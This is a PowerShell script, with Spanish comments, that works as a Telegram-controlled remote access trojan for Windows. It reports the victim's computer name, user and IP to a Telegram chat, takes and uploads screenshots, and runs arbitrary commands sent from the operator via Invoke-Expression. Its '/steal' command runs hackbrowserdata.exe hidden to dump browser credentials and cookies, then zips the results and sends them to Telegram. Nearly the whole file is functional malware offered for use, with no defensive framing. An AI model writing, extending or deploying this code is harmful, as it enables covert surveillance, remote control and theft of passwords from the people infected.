param(
    [string]$Token,
    [string]$ChatId
)

if (-not $Token -or -not $ChatId) {
    Write-Host "Error: Se requiere Token y ChatId"
    exit 1
}

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"

# Crear directorio
if (-not (Test-Path (Split-Path $LogFile))) {
    New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null
}

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

function Send-TelegramMessage {
    param([string]$Text)
    try {
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error enviando mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-TelegramFile {
    param([string]$FilePath, [string]$Caption = "")
    
    if (-not (Test-Path $FilePath)) {
        Write-Log "Archivo no existe: $FilePath"
        return $false
    }
    
    try {
        # Metodo nativo usando .NET WebClient (funciona en PS 5.1)
        $webClient = New-Object System.Net.WebClient
        $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
        
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        # Construir body multipart manualmente
        $header = "--$boundary`r`n" +
                  "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n" +
                  "$ChatId`r`n" +
                  "--$boundary`r`n" +
                  "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
                  "Content-Type: application/octet-stream`r`n`r`n"
        
        $footer = "`r`n--$boundary--`r`n"
        
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
        
        $body = New-Object byte[] ($headerBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($headerBytes, 0, $body, 0, $headerBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $body, $headerBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $body, ($headerBytes.Length + $fileBytes.Length), $footerBytes.Length)
        
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $response = $webClient.UploadData("$ApiUrl/sendDocument", "POST", $body)
        
        $webClient.Dispose()
        Write-Log "Archivo enviado: $fileName"
        return $true
        
    } catch {
        Write-Log "Error enviando archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-SystemInfo {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip
    } catch { $ip = "Desconocida" }
    
    try {
        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption
    } catch { $os = "Windows" }
    
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $path = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $result = Send-TelegramFile -FilePath $path -Caption "Screenshot $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        
        return $result
        
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-TelegramMessage -Text "Error al capturar pantalla: $($_.Exception.Message)"
        return $false
    }
}

# === STEAL BROWSER DATA ===
function Steal-BrowserData {
    Send-TelegramMessage -Text "Iniciando extraccion de datos..."
    Write-Log "Iniciando extraccion"
    
    if (-not (Test-Path $HackPath)) {
        Send-TelegramMessage -Text "Error: hackbrowserdata.exe no encontrado"
        return
    }
    
    # Guardar procesos de navegador actuales
    $existingBrowsers = Get-Process @("chrome", "msedge", "firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
    
    $outputDir = "$env:TEMP\browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    try {
        # Ejecutar hackbrowserdata
        $proc = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outputDir`" -f json" -PassThru -WindowStyle Hidden -Wait
        
        Write-Log "HackBrowserData finalizado con codigo: $($proc.ExitCode)"
        
        # Cerrar navegadores abiertos por hackbrowserdata (solo los nuevos)
        Start-Sleep -Seconds 1
        $currentBrowsers = Get-Process @("chrome", "msedge", "firefox") -ErrorAction SilentlyContinue
        foreach ($browser in $currentBrowsers) {
            if ($existingBrowsers -notcontains $browser.Id) {
                try {
                    $browser.Kill()
                    Write-Log "Cerrado navegador PID $($browser.Id)"
                } catch {}
            }
        }
        
        # Buscar y enviar archivos
        $files = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        if (-not $files) {
            Send-TelegramMessage -Text "No se encontraron archivos de datos"
            return
        }
        
        Send-TelegramMessage -Text "Encontrados $($files.Count) archivos. Enviando..."
        
        $sent = 0
        foreach ($file in $files) {
            $zipPath = "$env:TEMP\$($file.BaseName)_$(Get-Random).zip"
            
            try {
                Compress-Archive -Path $file.FullName -DestinationPath $zipPath -Force
                
                if (Send-TelegramFile -FilePath $zipPath -Caption $file.BaseName) {
                    $sent++
                }
                
                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
                
            } catch {
                Write-Log "Error con $($file.Name): $($_.Exception.Message)"
            }
        }
        
        Send-TelegramMessage -Text "Extraccion completada. Enviados $sent de $($files.Count) archivos."
        
    } finally {
        # Limpiar
        if (Test-Path $outputDir) {
            Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# === EJECUTAR COMANDO ===
function Execute-Command {
    param([string]$Command)
    
    Write-Log "Ejecutando: $Command"
    
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        
        if ([string]::IsNullOrWhiteSpace($output)) {
            $output = "(comando ejecutado sin salida)"
        }
        
        $tempFile = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $content = "Comando: $Command`nFecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output"
        [System.IO.File]::WriteAllText($tempFile, $content, [System.Text.Encoding]::UTF8)
        
        Send-TelegramFile -FilePath $tempFile -Caption "Resultado: $Command"
        
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
    } catch {
        Send-TelegramMessage -Text "Error ejecutando comando: $($_.Exception.Message)"
    }
}

# === PROCESAR COMANDOS ===
function Process-Command {
    param([string]$Text)
    
    $cmd = $Text.Trim().ToLower()
    $args = ""
    
    if ($cmd -match '^(/?\w+)\s*(.*)$') {
        $baseCmd = $Matches[1]
        $args = $Matches[2].Trim()
    } else {
        return
    }
    
    Write-Log "Procesando comando: $baseCmd"
    
    switch ($baseCmd) {
        "/help" {
            Send-TelegramMessage -Text @"
Comandos disponibles:
/help - Mostrar ayuda
/info - Info del sistema
/ls - Listar archivos
/pwd - Directorio actual
/cd <ruta> - Cambiar directorio
/cmd <comando> - Ejecutar comando
/captura - Capturar pantalla
/steal - Extraer datos de navegadores
"@
        }
        
        "/info" {
            Send-TelegramMessage -Text (Get-SystemInfo)
        }
        
        "/ls" {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-TelegramMessage -Text "Directorio actual: $(Get-Location)`n`n$items"
            } catch {
                Send-TelegramMessage -Text "Error: $($_.Exception.Message)"
            }
        }
        
        "/pwd" {
            Send-TelegramMessage -Text "Directorio: $(Get-Location)"
        }
        
        "/cd" {
            if ($args) {
                try {
                    Set-Location $args
                    Send-TelegramMessage -Text "Ahora en: $(Get-Location)"
                } catch {
                    Send-TelegramMessage -Text "Error: No se pudo cambiar a '$args'"
                }
            } else {
                Send-TelegramMessage -Text "Uso: /cd <ruta>"
            }
        }
        
        "/cmd" {
            if ($args) {
                Execute-Command -Command $args
            } else {
                Send-TelegramMessage -Text "Uso: /cmd <comando>"
            }
        }
        
        "/captura" {
            Send-TelegramMessage -Text "Capturando pantalla..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" {
            Steal-BrowserData
        }
        
        default {
            Write-Log "Comando desconocido: $baseCmd"
        }
    }
}

# === INICIO DEL BOT ===
Write-Log "=== BOT INICIADO ==="
Write-Log "ChatId: $ChatId"

# Enviar mensaje de inicio
$info = Get-SystemInfo
Write-Log "Info: $info"
Send-TelegramMessage -Text "Bot online - $info"

# Limpiar webhook
try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
    Write-Log "Webhook limpiado"
} catch {
    Write-Log "Error limpiando webhook: $($_.Exception.Message)"
}

# Bucle principal
$lastUpdateId = 0

while ($true) {
    try {
        $response = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=1" -TimeoutSec 60
        
        if ($response.ok -and $response.result.Count -gt 0) {
            $update = $response.result[0]
            $lastUpdateId = $update.update_id
            
            if ($update.message -and $update.message.text) {
                $msgChatId = [string]$update.message.chat.id
                
                if ($msgChatId -eq $ChatId) {
                    Process-Command -Text $update.message.text
                }
            }
        }
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") {
            Write-Log "Error: $err"
        }
        Start-Sleep -Seconds 2
    }
    
    Start-Sleep -Milliseconds 1500
}
